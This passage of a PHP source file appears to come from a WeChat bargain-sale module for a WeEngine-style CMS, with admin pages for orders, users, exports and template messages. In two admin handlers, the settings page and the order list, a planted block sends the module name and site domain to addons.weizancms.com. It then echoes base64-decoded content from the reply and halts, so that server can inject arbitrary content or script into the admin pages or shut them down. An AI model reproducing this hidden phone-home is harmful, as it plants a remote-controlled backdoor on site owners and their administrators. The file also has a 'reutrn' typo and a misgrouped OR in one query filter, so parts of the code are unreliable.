			$list = pdo_fetchall("SELECT * FROM " . tablename(DBUtil::$TABLE_XKWKJ) . " WHERE weid =:weid  ORDER BY createtime DESC, id DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize, array(':weid' => $this->weid));
			$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWKJ) . " WHERE weid =:weid ", array(':weid' => $this->weid));
			$pager = pagination($total, $pindex, $psize);
		} else if ($operation == 'delete') {
			$id = $_GPC['id'];
			pdo_delete(DBUtil::$TABLE_XKWJK_ORDER, array("kid" => $id));
			pdo_delete(DBUtil::$TABLE_XKWKJ_FIREND, array("kid" => $id));
			pdo_delete(DBUtil::$TABLE_XKWKJ_USER, array("kid" => $id));
			pdo_delete(DBUtil::$TABLE_XKWKJ, array('id' => $id));
			message('删除成功！', referer(), 'success');
		}

		include $this->template("xkwkj_manage");

	}

	/**
	 * author: 
	 * 设置
	 */
	public function doWebXKKjSetting()
	{
		global $_GPC, $_W;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
		$kjsetting = DBUtil::findUnique(DBUtil::$TABLE_XKWKJ_SETTING, array(':weid' => $this->weid));
		if (checksubmit('submit')) {
			$data = array(
				'weid' => $this->weid,
				'appid' => trim($_GPC['appid']),
				'appsecret' => trim($_GPC['appsecret']),
				'mchid' => trim($_GPC['mchid']),
				'shkey' => trim($_GPC['shkey']),
				'is_collect_user_info' => $_GPC['is_collect_user_info'],
				'help_kj_limit' => $_GPC['help_kj_limit']
			);
			if (!empty($kjsetting)) {
				DBUtil::updateById(DBUtil::$TABLE_XKWKJ_SETTING, $data, $kjsetting['id']);
			} else {
				DBUtil::create(DBUtil::$TABLE_XKWKJ_SETTING, $data);
			}
			message('参数设置成功！', $this->createWebUrl('XKKjSetting', array(
				'op' => 'display'
			)), 'success');
		}
		include $this->template("kjsetting");
	}

	/**
	 * author: weizan 
	 * 砍价 订单
	 */

	public function  doWebOrderList()
	{

		global $_W, $_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
		$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
		$kid = $_GPC['kid'];
		if ($operation == 'display') {

			

			$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);

			if (empty($xkwkj)) {
				message("砍价活动删除或不存在");

			}

			$keyword = $_GPC['keyword'];
			$where = '';
			$params = array(
				':kid' => $kid
			);


			$wxorder_no = $_GPC['wxorder_no'];

			if (!empty($wxorder_no)) {
				$where .= 'and wxorder_no =:wxorder_no';
				$params[":wxorder_no"] = $wxorder_no;
			}

			if (!empty($keyword)) {
				$where .= ' and (order_no like :keyword) or (tel like :keyword)';
				$params[':keyword'] = "%$keyword%";

			}
            $status = $_GPC['status'];
			if ($_GPC['status'] != '') {
				$where .= ' and status =:status';
				$params[':status'] = $_GPC['status'];
			}
			$pindex = max(1, intval($_GPC['page']));
			$psize = 20;
			$list = pdo_fetchall("SELECT r.*, u.nickname as nickname,u.headimgurl as headimgurl FROM "
				. tablename(DBUtil::$TABLE_XKWJK_ORDER) . " r left join ".tablename(DBUtil::$TABLE_XKWKJ_USER)
				."  u  on r.uid = u.id  WHERE r.kid =:kid " . $where . "  ORDER BY createtime DESC, id DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize, $params);
			$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWJK_ORDER) . " WHERE kid =:kid  " . $where, $params);
			$pager = pagination($total, $pindex, $psize);

		} else if ($operation == 'delete') {
			$id = $_GPC['id'];
			pdo_delete(DBUtil::$TABLE_XKWJK_ORDER, array("id" => $id));
			message('删除成功！', $this->createWebUrl('OrderList',array('kid'=>$kid)), 'success');
		} else if($operation == 'fh') {
			$id = $_GPC['id'];
			DBUtil::updateById(DBUtil::$TABLE_XKWJK_ORDER, array('status'=>$this::$KJ_STATUS_YFH), $id );
            $order = DBUtil::findById(DBUtil::$TABLE_XKWJK_ORDER, $id);
			$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $order['kid']);
			$user = DBUtil::findById(DBUtil::$TABLE_XKWKJ_USER, $order['uid']);
			$this->sendFHTemplateMsg($xkwkj, $user);
			message('发货成功！', $this->createWebUrl('OrderList',array('kid'=>$kid)), 'success');





		}

		include $this->template("order_list");
	}

	/**
	 * author: 
	 * 订单详细
	 */
	public function  doWebOrderDetail()
	{
		global $_W, $_GPC;
		$kid = $_GPC['kid'];
		$oid = $_GPC['oid'];
		$order = DBUtil::findById(DBUtil::$TABLE_XKWJK_ORDER, $oid);
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);
		include $this->template("order_detail");
	}

	/**
	 * author: 	
	 * 参与用户
	 */
	public function  doWebJoinUser()
	{
		global $_W, $_GPC;

		$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';

		if ($operation == 'display') {

			$kid = $_GPC['kid'];

			$wkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);

			if (empty($wkj)) {
				message("砍价活动删除或不存在");

			}

			$keyword = $_GPC['keyword'];
			$where = '';
			$params = array(
				':kid' => $kid
			);


			if (!empty($keyword)) {
				$where .= ' and (u.nickname like :nickname)';
				$params[':nickname'] = "%$keyword%";

			}

			$pindex = max(1, intval($_GPC['page']));
			$psize = 20;
			$list = pdo_fetchall("SELECT u.*, ui.uname as uname, ui.tel as tel FROM " . tablename(DBUtil::$TABLE_XKWKJ_USER) . " u left join ".tablename(DBUtil::$TABLE_XKWKJ_USER_INFO)." ui on ui.openid= u.openid WHERE u.kid =:kid " . $where . "  ORDER BY createtime DESC, id DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize, $params);
			$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWKJ_USER) . " u WHERE u.kid =:kid  " . $where, $params);
			$pager = pagination($total, $pindex, $psize);

		} else if ($operation == 'delete') {
			$uid = $_GPC['uid'];
			pdo_delete(DBUtil::$TABLE_XKWJK_ORDER, array("uid" => $uid));
			pdo_delete(DBUtil::$TABLE_XKWKJ_FIREND, array("uid" => $uid));
			pdo_delete(DBUtil::$TABLE_XKWKJ_USER, array("id" => $uid));
			message('删除成功！', referer(), 'success');
		}


		include $this->template("user_list");


	}


	public function  doWebAllUser()
	{
		global $_W, $_GPC;

		$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';

		if ($operation == 'display') {





			$keyword = $_GPC['keyword'];
			$where = '';
			$params = array(
				':weid' => $this->weid
			);


			if (!empty($keyword)) {
				$where .= ' and (nickname like :nickname)';
				$params[':nickname'] = "%$keyword%";

			}

			$pindex = max(1, intval($_GPC['page']));
			$psize = 20;
			$list = pdo_fetchall("SELECT * FROM " . tablename(DBUtil::$TABLE_XKWKJ_USER_INFO) . " WHERE weid =:weid " . $where . "  ORDER BY createtime DESC, id DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize, $params);
			$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWKJ_USER_INFO) . " WHERE weid =:weid  " . $where, $params);
			$pager = pagination($total, $pindex, $psize);

		} else if ($operation == 'delete') {
			$uid = $_GPC['uid'];
			pdo_delete(DBUtil::$TABLE_XKWKJ_USER_INFO, array("id" => $uid));
			message('删除成功！', referer(), 'success');
		}

		include $this->template("all_user_list");
	}

	/**

	 * 抓奖品记录
	 */
	public function doWebhelpFirend()
	{
		global $_W, $_GPC;
		$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
		$kid = $_GPC['kid'];


		$keyword = $_GPC['keywords'];
		$where = '';
		$params = array(
			':kid' => $kid

		);


		if (!empty($keyword)) {
			$where .= ' and f.nickname like :nickname';
			$params[':nickname'] = "%$keyword%";
		}

		if (!empty($_GPC['uid'])) {
			$where .= ' and f.uid=:uid';
			$params[':uid'] = $_GPC['uid'];
		}

		if ($operation == 'display') {
			$pindex = max(1, intval($_GPC['page']));
			$psize = 20;
			$list = pdo_fetchall("select * from " . tablename(DBUtil::$TABLE_XKWKJ_FIREND) . " f where f.kid=:kid " . $where . " order by f.createtime desc LIMIT " . ($pindex - 1) * $psize . ',' . $psize, $params);
			$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWKJ_FIREND) . " f where f.kid=:kid  " . $where, $params);
			$pager = pagination($total, $pindex, $psize);

		} elseif ($operation == 'delete') {
			$id = $_GPC['id'];
			pdo_delete(DBUtil::$TABLE_XKWKJ_FIREND, array('id' => $id));
			message('删除成功！', referer(), 'success');
		}
		include $this->template('kj_firends');

	}


	/**
	 * author: weizan 
	 * 抓奖品记录导出
	 */
	public function  doWeborderDownload()
	{
		require_once 'orderdownload.php';
	}

	/**
	 * author: weizan 
	 * 用户信息导出
	 */
	public function  doWebUDownload()
	{
		require_once 'udownload.php';
	}

	/***************************函数********************************/

	public function getJoinCount($xkwkj) {
		$userCount = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWKJ_USER) . " WHERE kid =:kid", array(":kid" => $xkwkj['id']));
		return $userCount + $xkwkj['v_user'];
	}
	/**
	 * author: weizan 
	 * @param $kid
	 * @param $status
	 * @return bool数量
	 */
	public function getOrderCount($kid, $status)
	{
		$orderCount = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWJK_ORDER) . " WHERE kid =:kid and status=:status", array(":kid" => $kid, ":status" => $status));
		return $orderCount;
	}

	/**
	 * author: 
	 * @param $kid
	 * 查找剩余数量
	 */
	public function getLeftCount($xkwkj) {

		if ($xkwkj['pay_type'] == 1) { //在线支付
			$orderCount = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWJK_ORDER) . " WHERE kid=:kid and (status=4 or status=5) ", array( ":kid" => $xkwkj['id']));
		} else {
			$orderCount = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWJK_ORDER) . " WHERE kid=:kid ", array( ":kid" => $xkwkj['id']));
		}



		return $xkwkj['p_kc'] - $orderCount;
	}

	/**
	 * author: 
	 * 查找参加用户
	 */
	public function  findJoinUser($kid, $openid)
	{

		return DBUtil::findUnique(DBUtil::$TABLE_XKWKJ_USER, array(':kid' => $kid, ':openid' => $openid));

	}

	/**

	 * @param $openid
	 * @param $weid
	 * @return bool 查找共享的用户信息
	 */
	public function findUniUserInfo($openid, $weid) {
		return DBUtil::findUnique(DBUtil::$TABLE_XKWKJ_USER_INFO, array(':weid' => $weid, ':openid' => $openid));
	}

	/**
	
	 * @param $uid
	 * @param $fopenid
	 * @return bool
	 * 超找帮助用户
	 */
	public function  findHelpFirend($uid, $fopenid)
	{
		return DBUtil::findUnique(DBUtil::$TABLE_XKWKJ_FIREND, array(':uid' => $uid, ':openid' => $fopenid));
	}

	/**
	 * author: 
	 * @param $kid
	 * @param $fopenid
	 *
	 */
    public function findHelpFirendLimit($kid, $fopenid) {
		return DBUtil::findUnique(DBUtil::$TABLE_XKWKJ_FIREND, array(':kid' => $kid, ':openid' => $fopenid));
	}

	/**
	 * author: 
	 * @param $kid
	 * @param $uid
	 * @return bool
	 * 每天参加砍价用户数
	 */
	public function findDayKjCount($kid, $uid) {
		$today_beginTime = strtotime(date('Y-m-d' . '00:00:00', TIMESTAMP));
		$today_endTime = strtotime(date('Y-m-d' . '23:59:59', TIMESTAMP));
		$count = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWKJ_FIREND) . " WHERE  kid=:kid and uid=:uid and createtime<=:endtime and  createtime>=:starttime ", array(':kid' => $kid, ":uid" => $uid, ":endtime" => $today_endTime, ":starttime" => $today_beginTime));
		return $count;
	}

	public function findJoinUserCount($kid) {
		$count = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWKJ_USER) . " WHERE  kid=:kid", array(':kid' => $kid));
	    return $count;
	}

	public function findSameKJHelpCount($kid, $fopenid) {
		$count = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWKJ_FIREND) . " WHERE  kid=:kid and openid=:openid", array(':kid' => $kid, ":openid" => $fopenid));
		return $count;
	}

	public function findHelpProductCount($fopenid) {
		$count = pdo_fetchcolumn('SELECT COUNT(DISTINCT kid) FROM ' . tablename(DBUtil::$TABLE_XKWKJ_FIREND) . " WHERE openid=:openid", array( ":openid" => $fopenid));
		return $count;
	}
	/**
	 * author: weizan 
	 * @param $type
	 * 获取转向URL
	 */
	public function  getRedirectUrl($type, $parmas = array())
	{
		switch ($type) {

			case Value::$REDIRECT_USER_INDEX://首页
				$redirectUrl = $this->createMobileUrl('index', $parmas, true);
				break;
			case Value::$REDIRECT_KJ:
				$redirectUrl = $this->createMobileUrl('kj', $parmas, true);
				break;
			case Value::$REDIRECT_MY_KJ:
				$redirectUrl = $this->createMobileUrl('MyKjList', $parmas, true);
				break;
		}

		return MonUtil::str_murl($redirectUrl);
	}


	/**
	 * author: weizan 
	 * @param $status
	 * 状态文字
	 */
	public function  getStatusText($status)
	{
		switch ($status) {
			case $this::$KJ_STATUS_WKS:
				return "未开始";
				break;
			case $this::$KJ_STATUS_ZC:
				return "正常";
				break;
			case $this::$KJ_STATUS_JS:
				return "已结束";
				break;
			case $this::$KJ_STATUS_XD:
				return "已下单";
				break;
			case $this::$KJ_STATUS_GM:
				return "已支付购买";
			break;
			case $this::$KJ_STATUS_YFH:
			return "已发货";
			break;
		}

	}


	/**
	 * author: weizan 
	 * @param $wkj
	 * @param $joinUser
	 * @return int
	 * 状态获取
	 */
	public function getStatus($xkwkj, $joinUser)
	{


		if (TIMESTAMP < $xkwkj['starttime']) {
			return $this::$KJ_STATUS_WKS;
		}
		if (TIMESTAMP > $xkwkj['endtime']) {
			return $this::$KJ_STATUS_JS;
		}

		if (!empty($joinUser)) {
			$orderInfo = $this->findOrderInfo($xkwkj['id'], $joinUser['id']);


			if (empty($orderInfo)) {
				return $this::$KJ_STATUS_ZC;
			} else {
				return $orderInfo['status'];
			}
	  } else {
	       return $this::$KJ_STATUS_ZC;
	  }

	}

	/**
	 * author: 
	 * @param $kid
	 * @param $uid
	 * @return bool 超找 订单信息
	 */
	public function findOrderInfo($kid, $uid)
	{
		$orderInfo = DBUtil::findUnique(DBUtil::$TABLE_XKWJK_ORDER, array(':kid' => $kid, ':uid' => $uid));
		return $orderInfo;
	}

	/**
	 * author: 
	 * @param $wkj
	 * @param $user
	 * 获取砍价的价格
	 */
	public function getKjPrice($xkwkj, $userNowPrice)
	{

		if (empty($xkwkj['kj_rule'])) {
			return 0;
		}

		if ($userNowPrice <= $xkwkj['p_low_price']) {
			return 0;
		}

		$kj_rule = unserialize($xkwkj['kj_rule']);
		$kj_price = 0;
		$inRule = false;
		foreach ($kj_rule as $rule) {

			if ($userNowPrice >= $rule['rule_pice']) {
				$kj_price = rand($rule['rule_start'] * 100, $rule['rule_end'] * 100) / 100;
				$inRule = true;
				break;
			}

		}

		if (!$inRule) {
			$kj_price = rand(1 * 100, 2 * 100) / 100;
		}

		if ($userNowPrice - $kj_price < $xkwkj['p_low_price']) {
		    return $userNowPrice - $xkwkj['p_low_price'];
			//return 0;
		}

		return $kj_price;
	}


	/**
	 * author: weizan 
	 * @param $wkj
	 * @param $msg_type
	 * @return mixed
	 * 获取随机文字信息
	 */
	public function  getTipMsg($wkj, $msg_type)
	{
		if (empty($wkj)) {
			reutrn;
		}
		switch ($msg_type) {
			case $this::$TIP_DIALOG:
				$msgContent = $wkj['kj_dialog_tip'];
				break;
			case $this::$TIP_U_FIRST:
				$msgContent = $wkj['u_fist_tip'];
				break;
			case $this::$TIP_U_ALREADY:
				$msgContent = $wkj['u_already_tip'];
				break;
			case $this::$TIP_RANK:
				$msgContent = $wkj['rank_tip'];
				break;
			case $this::$TIP_FK_FIRST:
				$msgContent = $wkj['fk_fist_tip'];
				break;
			case $this::$TIP_FK_ALREADY:
				$msgContent = $wkj['fk_already_tip'];
				break;
		}
		$msgContent = trim($msgContent);
		$msg_arr = explode("\r\n", $msgContent);
		if (count($msg_arr) == 1) {
			return $msg_arr[0];
		} else {
			return $msg_arr[rand(0, count($msg_arr) - 1)];
		}
	}

	public function findXKKJsetting()
	{
		$xkkjsetting = DBUtil::findUnique(DBUtil::$TABLE_XKWKJ_SETTING, array(":weid" => $this->weid));
		return $xkkjsetting;
	}

	function  encode($value,$dc)
	{

		if ($dc == 1) {
			return $value;
		}

		if($dc == 2) {
			return iconv("utf-8", "gb2312", $value);
		}

	}

	public function doWebDeleteXkWkj()
	{
		global $_GPC, $_W;

		foreach ($_GPC['idArr'] as $k => $kid) {
			$id = intval($kid);
			if ($id == 0)
				continue;
			pdo_delete(DBUtil::$TABLE_XKWJK_ORDER, array("kid" => $id));
			pdo_delete(DBUtil::$TABLE_XKWKJ_FIREND, array("kid" => $id));
			pdo_delete(DBUtil::$TABLE_XKWKJ_USER, array("kid" => $id));
			pdo_delete(DBUtil::$TABLE_XKWKJ, array('id' => $id));
		}
		echo json_encode(array('code' => 200));
	}
	/***
	 * 批量删除
	**/
	/**
	 * author: 
	 * 删除摇一摇
	 */
	public function doWebDeleteUser()
	{
		global $_GPC, $_W;

		foreach ($_GPC['idArr'] as $k => $uid) {
			$id = intval($uid);
			if ($id == 0)
				continue;
			pdo_delete(DBUtil::$TABLE_XKWJK_ORDER, array("uid" => $id));
			pdo_delete(DBUtil::$TABLE_XKWKJ_FIREND, array("uid" => $id));
			pdo_delete(DBUtil::$TABLE_XKWKJ_USER, array("id" => $id));
		}
		echo json_encode(array('code' => 200));
	}

	public function doWebDeleteOrder()
	{
		global $_GPC, $_W;
		foreach ($_GPC['idArr'] as $k => $oid) {
			$id = intval($oid);
			if ($id == 0)
				continue;
			pdo_delete(DBUtil::$TABLE_XKWJK_ORDER, array("id" => $id));

		}
		echo json_encode(array('code' => 200));
	}

	/**
	 * 首页设置
	 */
	public function doWebIndexSetting() {
		global $_GPC, $_W;
		$indexsetting = DBUtil::findUnique(DBUtil::$TABLE_XKWKJ_INDEX_SETTING, array(':weid' => $this->weid));
		if (checksubmit('submit')) {
			$data = array(
				'weid' => $this->weid,
				'announcement' => trim($_GPC['announcement']),
				'banner_bg' => trim($_GPC['banner_bg']),
				'banner_url' => trim($_GPC['banner_url']),
				'share_title' => $_GPC['share_title'],
				'share_icon' => $_GPC['share_icon'],
				'share_content' => $_GPC['share_content']
			);
			if (!empty($indexsetting)) {
				DBUtil::updateById(DBUtil::$TABLE_XKWKJ_INDEX_SETTING, $data, $indexsetting['id']);
			} else {
				DBUtil::create(DBUtil::$TABLE_XKWKJ_INDEX_SETTING, $data);
			}
			message('首页参数设置成功！', $this->createWebUrl('IndexSetting', array(
				'op' => 'display'
			)), 'success');
		}
		include $this->template("index_setting");
	}

	/**
	 * author: 
	 * @param $qmql
	 * @param $pname
	 * @param $fname
	 * @param $floor
	 * @param $uopenid发送模板消息
	 */
	public function sendTemplateMsg($xkwkj, $fname, $price, $uprice, $uopenid) {
		$templateMsg = array();
		if ($xkwkj['tmp_enable'] == 1) {
			$templateMsg['template_id'] = $xkwkj['tmpId'];
			$templateMsg['touser'] = $uopenid;
			$templateMsg['url'] = MonUtil::str_murl( $this->createMobileUrl ('auth',  array('kid' => $xkwkj['id'],'au'=>Value::$REDIRECT_USER_INDEX), true));
			$templateMsg['topcolor'] = '#FF0000';
			$data = array();
			$data['first'] = array('value'=>$fname. "好友帮您砍掉了".$price."元！你当前商品金额为" .$uprice . "元" , 'color'=>'#173177');

			$data['keyword1'] = array('value'=> $xkwkj['title'], 'color'=>'#173177');
			$data['keyword2'] = array('value'=> '好友帮助砍价', 'color'=>'#173177');
			$data['remark'] = array('value'=>"继续邀请好友帮您砍价吧，加油哦！", 'color'=>'#173177');

			$templateMsg['data'] = $data;
			$jsonData = json_encode($templateMsg);
			WeUtility::logging('info',"发送模板消砍价".$jsonData);
			load()->func('communication');
			$acessToken = $this->getAccessToken();
			$apiUrl = "https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=".$acessToken;
			$result = ihttp_request($apiUrl, $jsonData);
			WeUtility::logging('info',"发送模板消息砍价返回".$result);

			WeUtility::logging('info',"发送模板消息砍价返回".json_encode($result));
		}
	}

	public function sendFHTemplateMsg($xkwkj, $user) {
		$templateMsg = array();
		if ($xkwkj['fh_tmp_enable'] == 1) {
			$templateMsg['template_id'] = $xkwkj['fh_tmp_id'];
			$templateMsg['touser'] = $user['openid'];
			$templateMsg['url'] = MonUtil::str_murl( $this->createMobileUrl ('auth',  array('kid' => $xkwkj['id'],'au'=>Value::$REDIRECT_USER_INDEX), true));
			$templateMsg['topcolor'] = '#FF0000';
			$data = array();
			$data['first'] = array('value'=>$user['nickname']. "您好，您参与".$xkwkj['title']."砍价活动的商品已处理（发货）啦！" , 'color'=>'#173177');

			$data['keyword1'] = array('value'=> $xkwkj['p_name'], 'color'=>'#173177');
			$data['keyword2'] = array('value'=> date("Y-m-d H:i", TIMESTAMP), 'color'=>'#173177');
			$data['remark'] = array('value'=>"备注：详情可以咨询活动主办方哦！", 'color'=>'#173177');

			$templateMsg['data'] = $data;
			$jsonData = json_encode($templateMsg);
			WeUtility::logging('info',"发送发货模板消砍价".$jsonData);
			load()->func('communication');
			$acessToken = $this->getAccessToken();
			$apiUrl = "https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=".$acessToken;
			$result = ihttp_request($apiUrl, $jsonData);
			WeUtility::logging('info',"发送模板消息砍价返回".$result);

			WeUtility::logging('info',"发送模板消息砍价返回".json_encode($result));
		}
	}

	public  function  getAccessToken () {
		global $_W;
		load()->classs('weixin.account');
		$accObj = WeixinAccount::create($_W['acid']);
		$access_token = $accObj->fetch_token();
		return $access_token;
	}

}